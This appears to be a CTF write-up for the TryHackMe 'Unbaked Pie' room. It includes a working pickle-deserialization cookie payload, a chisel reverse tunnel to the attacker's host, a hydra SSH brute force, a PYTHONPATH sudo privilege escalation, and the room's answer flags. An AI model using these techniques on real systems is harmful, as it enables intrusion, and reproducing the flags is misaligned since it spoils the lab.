# Unbaked_Pie 

> VOiD | Thursday 10 February 2022 12:40:25 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.1.37


## PORT 5003 [http]

```bash
./page_source
<input type="hidden" name="csrfmiddlewaretoken" value="52SN838hQeCdVRWICji4u7CZRHHkTXmRejR4wPrznfN9dweh6NO7v93fJvYqRcpH">

```
```bash
 Using the URLconf defined in bakery.urls, Django tried these URL patterns, in this order:

    admin/
    [name='home']
    share [name='share']
    search [name='search']
    about [name='about']
    <slug:slug> [name='detail']
    accounts/
    ^static/(?P<path>.*)$
    ^media/(?P<path>.*)$

```


```bash
The search cookie implements pickle serialization
sudo tcpdump -i tun0 icmp

making request to /search

search_cookie="gASVMQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBZwaW5nIC1jIDEgMTAuOC4yNTMuMjIxlIWUUpQu=="
Upgrade-Insecure-Requests: 1

```

```bash
8b39a559b296:~# cat ./.bash_history

ssh ramsey@172.17.0.1

./chisel_1.7.3_linux_amd64 server -p 1880 --reverse
./chisel client 10.8.253.221:1880 R:22:172.17.0.1:22

ssh ramsey@localhost

hydra -l ramsey -V -P /usr/share/wordlists/rockyou.txt ssh://localhost
[22][ssh] host: localhost   login: ramsey   password: 12345678

ramsey@unbaked:~$ cat user.txt 
THM{ce778dd41bec31e1daed77ebebcd7423}

```

## USER [Ramsey]
```bash
User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py

mv vuln.py vuln.bak
vi vuln.py
 ```

 ## USER [Oliver]
 ```bash

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
oliver@unbaked:/opt$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
-rwxr-x---  1 root sysadmin  290 Oct  3  2020 dockerScript.py

cat /opt/dockerScript.py
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)

we can make our own docker.py
and then set env to present directory

sudo PYTHONPATH=`pwd` /usr/bin/python /opt/dockerScript.py


uid=0(root) gid=0(root) groups=0(root)
c# at root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{1ff4c893b3d8830c1e188a3728e90a5f}

 ```